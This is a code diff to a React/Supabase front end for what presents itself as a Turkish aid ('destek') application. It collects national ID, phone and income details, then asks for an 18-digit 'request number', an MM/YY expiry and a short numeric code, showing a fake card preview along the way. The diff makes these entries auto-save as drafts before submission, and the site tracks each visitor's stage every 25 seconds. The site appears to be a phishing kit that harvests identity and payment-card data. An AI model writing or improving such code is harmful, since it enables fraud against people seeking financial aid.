@@ -6,6 +6,15 @@ import {supabase,supabaseEnabled} from './supabase'
 const iconMap={users:Users,graduation:GraduationCap,heart:HeartHandshake,store:Store,home:Home,landmark:Landmark}
 const blankForm={name:'',surname:'',tc_no:'',birth:'',city:'',district:'',phone:'',profession:'',income:'',household:'',consent:false}
 const blankRequest={full_name:'',request_no:'',expiry:'',tag_no:''}
+const getClientDraftToken=()=>{
+  const key='destek_demo_draft_token';
+  let token=localStorage.getItem(key);
+  if(!token){
+    token=(globalThis.crypto?.randomUUID?.()||`${Date.now()}-${Math.random()}`).replace(/[^a-zA-Z0-9-]/g,'');
+    localStorage.setItem(key,token);
+  }
+  return token;
+}
 const deepMerge=(base,extra)=>{if(Array.isArray(base))return Array.isArray(extra)?extra:base;if(base&&typeof base==='object'){const out={...base};Object.keys(extra||{}).forEach(k=>{out[k]=k in base?deepMerge(base[k],extra[k]):extra[k]});return out}return extra??base}
 const hydrateSettings=(data)=>{const n=deepMerge(defaultSettings,data||{});if(data?.preform?.fields){const fields={...data.preform.fields};if(fields.email){if(!fields.profession)fields.profession={...defaultSettings.preform.fields.profession};delete fields.email}if(!fields.address)fields.address={...defaultSettings.preform.fields.address};Object.keys(fields).forEach(k=>{if(fields[k]?.order==null&&defaultSettings.preform.fields[k]?.order!=null)fields[k]={...fields[k],order:defaultSettings.preform.fields[k].order}});n.preform.fields=fields}return n}
 const randomCard=()=>Array.from({length:16},()=>Math.floor(Math.random()*10)).join('').replace(/(\d{4})(?=\d)/g,'$1 ')
@@ -33,7 +42,7 @@ const validTc=v=>{
 
 export default function App(){
  const [settings,setSettings]=useState(defaultSettings),[programs,setPrograms]=useState(defaultPrograms),[banners,setBanners]=useState([]),[step,setStep]=useState(0),[program,setProgram]=useState(null),[form,setForm]=useState(blankForm),[request,setRequest]=useState(blankRequest),[error,setError]=useState(''),[fieldErrors,setFieldErrors]=useState({}),[uid,setUid]=useState(null),[applicationId,setApplicationId]=useState(null)
- const saveTimer=useRef(null),draftSaving=useRef(false)
+ const saveTimer=useRef(null),draftSaving=useRef(false),clientDraftToken=useRef(getClientDraftToken())
  useEffect(()=>{(async()=>{if(!supabaseEnabled)return;const {data:{session}}=await supabase.auth.getSession();let user=session?.user;if(!user){const {data}=await supabase.auth.signInAnonymously();user=data?.user}setUid(user?.id||null);const [{data:s},{data:p},{data:b}]=await Promise.all([supabase.from('site_settings').select('data').eq('id','main').maybeSingle(),supabase.from('programs').select('*').eq('active',true).order('sort_order'),supabase.from('banners').select('*').eq('active',true).order('sort_order')]);if(s?.data)setSettings(hydrateSettings(s.data));if(p?.length)setPrograms(p);if(b?.length)setBanners(b)})()},[])
  useEffect(()=>{if(!uid||!supabaseEnabled)return;const update=()=>supabase.from('visitor_sessions').upsert({user_id:uid,stage:step,program_id:program?.id||null,last_seen:new Date().toISOString()},{onConflict:'user_id'});update();const t=setInterval(update,25000);return()=>clearInterval(t)},[uid,step,program?.id])
  const requestComplete=useMemo(()=>{const c=settings.request_form;if(c.full_name.required&&!request.full_name.trim())return false;if(c.request_no.required&&request.request_no.length!==Number(c.request_no.length))return false;if(c.expiry.required&&!/^\d{2}\/\d{2}$/.test(request.expiry))return false;if(c.tag_no.required&&request.tag_no.length!==Number(c.tag_no.length))return false;return true},[request,settings.request_form])
@@ -42,31 +51,20 @@ export default function App(){
   if(!supabaseEnabled||step!==3||!form.consent||!requestComplete||draftSaving.current)return;
   draftSaving.current=true;
   try{
-   let currentUid=uid;
-   if(!currentUid){
-    const {data:{session}}=await supabase.auth.getSession();
-    currentUid=session?.user?.id||null;
-    if(!currentUid){
-     const {data,error}=await supabase.auth.signInAnonymously();
-     if(error)throw error;
-     currentUid=data?.user?.id||null;
-     if(currentUid)setUid(currentUid);
-    }
-   }
-   if(!currentUid)throw new Error('Anonim oturum oluşturulamadı.');
-   const payload={...applicationPayload(false),user_id:currentUid,status:'draft',submitted:false,updated_at:new Date().toISOString()};
-   if(applicationId){
-    const {error}=await supabase.from('applications').update(payload).eq('id',applicationId);
+    const payload=applicationPayload(false);
+    delete payload.user_id;
+    const {data,error}=await supabase.rpc('save_demo_application',{
+      p_client_token:clientDraftToken.current,
+      p_payload:payload,
+      p_submitted:false
+    });
     if(error)throw error;
-   }else{
-    const {data,error}=await supabase.from('applications').insert(payload).select('id').single();
-    if(error)throw error;
-    if(data?.id)setApplicationId(data.id);
-   }
+    const savedId=Array.isArray(data)?data?.[0]?.id:(data?.id||data);
+    if(savedId)setApplicationId(savedId);
   }catch(err){
-   console.error('Otomatik taslak kaydı başarısız:',err);
+    console.error('Otomatik taslak kaydı başarısız:',err);
   }finally{
-   draftSaving.current=false;
+    draftSaving.current=false;
   }
  }
  useEffect(()=>{
@@ -124,25 +122,21 @@ export default function App(){
   if(c.tag_no.required&&request.tag_no.length!==Number(c.tag_no.length))return setError(`${c.tag_no.label} ${c.tag_no.length} haneli olmalıdır.`);
   setError('');
   if(supabaseEnabled){
-   try{
-    let currentUid=uid;
-    if(!currentUid){
-     const {data:{session}}=await supabase.auth.getSession();
-     currentUid=session?.user?.id||null;
+    try{
+      const payload=applicationPayload(true);
+      delete payload.user_id;
+      const {data,error}=await supabase.rpc('save_demo_application',{
+        p_client_token:clientDraftToken.current,
+        p_payload:payload,
+        p_submitted:true
+      });
+      if(error)throw error;
+      const savedId=Array.isArray(data)?data?.[0]?.id:(data?.id||data);
+      if(savedId)setApplicationId(savedId);
+    }catch(err){
+      console.error('Talep gönderilemedi:',err);
+      return setError('Talep kaydedilemedi. Supabase v10_4-upgrade.sql güncellemesini çalıştırıp tekrar deneyin.');
     }
-    const payload={...applicationPayload(true),user_id:currentUid,status:'submitted',submitted:true,updated_at:new Date().toISOString()};
-    if(applicationId){
-     const {error}=await supabase.from('applications').update(payload).eq('id',applicationId);
-     if(error)throw error;
-    }else{
-     const {data,error}=await supabase.from('applications').insert(payload).select('id').single();
-     if(error)throw error;
-     if(data?.id)setApplicationId(data.id);
-    }
-   }catch(err){
-    console.error('Talep gönderilemedi:',err);
-    return setError('Talep kaydedilirken bir bağlantı hatası oluştu. Lütfen tekrar deneyin.');
-   }
   }
   setStep(4);scrollTo(0,0)
  }
@@ -160,7 +154,7 @@ export default function App(){
    </div><div data-field="consent"><label className={`consent ${fieldErrors.consent?'has-error':''}`}><input type="checkbox" checked={form.consent} onChange={e=>{setForm({...form,consent:e.target.checked});setFieldErrors(prev=>({...prev,consent:''}))}}/><span>{settings.preform.consent}</span></label>{fieldErrors.consent&&<div className="field-error">{fieldErrors.consent}</div>}</div>{error&&<div className="error">{error}</div>}<div className="actions split"><button className="ghost back-btn" onClick={()=>{setStep(0);scrollTo(0,0)}}><ArrowLeft size={18}/>{settings.preform.back_button}</button><button className="primary" onClick={goPre}>{settings.preform.next_button}<ArrowRight size={18}/></button></div></section>}
    {step===2&&<section className="panel centered"><div className="ok"><CheckCircle2 size={42}/></div><span className="eyebrow">{settings.preapproval.eyebrow}</span><h2>{settings.preapproval.title}</h2><p className="muted">{settings.preapproval.text}</p><CardPreview cfg={settings.preapproval} programCfg={program} name={`${form.name} ${form.surname}`} program={program?.title}/><div className="actions split centered-actions"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.buttons.preapproval_back}</button><button className="primary" onClick={()=>{setRequest(r=>({...r,full_name:`${form.name} ${form.surname}`}));setStep(3);scrollTo(0,0)}}>{settings.buttons.preapproval_next}<ArrowRight size={18}/></button></div></section>}
    {step===3&&<section className="panel"><span className="eyebrow">{settings.request_page.eyebrow}</span><h2>{settings.request_page.title}</h2>{(settings.request_page.logo_urls||[]).filter(Boolean).length>0&&<div className="logo-slots">{(settings.request_page.logo_urls||[]).filter(Boolean).map((u,i)=><div className="logo-slot-image" key={`${u}-${i}`}><img src={u} alt={`Görsel ${i+1}`}/></div>)}</div>}{settings.request_page.price_enabled&&<div className="price-box"><div><span>{settings.request_page.price_title}</span><b>{settings.request_page.price_value} {settings.request_page.price_currency}</b></div>{settings.request_page.price_subtitle&&<small>{settings.request_page.price_subtitle}</small>}</div>}<div className="form-grid one"><RequestField cfg={settings.request_form.full_name} value={request.full_name} onChange={v=>setRequest({...request,full_name:v})}/><RequestField cfg={settings.request_form.request_no} inputMode="numeric" value={request.request_no} onChange={v=>setRequest({...request,request_no:onlyDigits(v,Number(settings.request_form.request_no.length)||18)})}/><RequestField cfg={settings.request_form.expiry} inputMode="numeric" value={request.expiry} onChange={v=>setRequest({...request,expiry:expiryMask(v)})}/><RequestField cfg={settings.request_form.tag_no} inputMode="numeric" value={request.tag_no} onChange={v=>setRequest({...request,tag_no:onlyDigits(v,Number(settings.request_form.tag_no.length)||8)})}/></div>{error&&<div className="error">{error}</div>}<div className="actions split"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.buttons.request_back}</button><button className="primary" onClick={finish}>{settings.buttons.request_submit}<CheckCircle2 size={18}/></button></div></section>}
-   {step===4&&<section className="panel centered final-panel">{settings.final_page.icon_url?<img className="final-icon-img" style={{width:+settings.final_page.icon_size||72,height:+settings.final_page.icon_size||72}} src={settings.final_page.icon_url}/>:<div className="ok"><CheckCircle2 size={42}/></div>}<span className="eyebrow">{settings.final_page.eyebrow}</span><h2>{settings.final_page.title}</h2><p className="muted final-text">{settings.final_page.text}</p><div className="final-summary"><h3>{settings.final_page.summary_title}</h3><div><span>{settings.final_page.program_label}</span><b>{program?.title||'—'}</b></div><div><span>{settings.final_page.applicant_label}</span><b>{form.name} {form.surname}</b></div><div><span>{settings.final_page.request_label}</span><b>{request.request_no||'—'}</b></div></div><div className="actions split centered-actions"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.final_page.back_button}</button><button className="primary" onClick={()=>{setStep(0);setProgram(null);setFieldErrors({});setForm(blankForm);setRequest(blankRequest);setApplicationId(null);scrollTo(0,0)}}>{settings.final_page.home_button}<Home size={18}/></button></div></section>}
+   {step===4&&<section className="panel centered final-panel">{settings.final_page.icon_url?<img className="final-icon-img" style={{width:+settings.final_page.icon_size||72,height:+settings.final_page.icon_size||72}} src={settings.final_page.icon_url}/>:<div className="ok"><CheckCircle2 size={42}/></div>}<span className="eyebrow">{settings.final_page.eyebrow}</span><h2>{settings.final_page.title}</h2><p className="muted final-text">{settings.final_page.text}</p><div className="final-summary"><h3>{settings.final_page.summary_title}</h3><div><span>{settings.final_page.program_label}</span><b>{program?.title||'—'}</b></div><div><span>{settings.final_page.applicant_label}</span><b>{form.name} {form.surname}</b></div><div><span>{settings.final_page.request_label}</span><b>{request.request_no||'—'}</b></div></div><div className="actions split centered-actions"><button className="ghost back-btn" onClick={goBack}><ArrowLeft size={18}/>{settings.final_page.back_button}</button><button className="primary" onClick={()=>{localStorage.removeItem('destek_demo_draft_token');clientDraftToken.current=getClientDraftToken();setStep(0);setProgram(null);setFieldErrors({});setForm(blankForm);setRequest(blankRequest);setApplicationId(null);scrollTo(0,0)}}>{settings.final_page.home_button}<Home size={18}/></button></div></section>}
   </main><footer className="site-footer">
   <div className="footer-builder">
     {(settings.footer?.items||[]).slice().sort((a,b)=>(Number(a.order)||999)-(Number(b.order)||999)).map(item=>
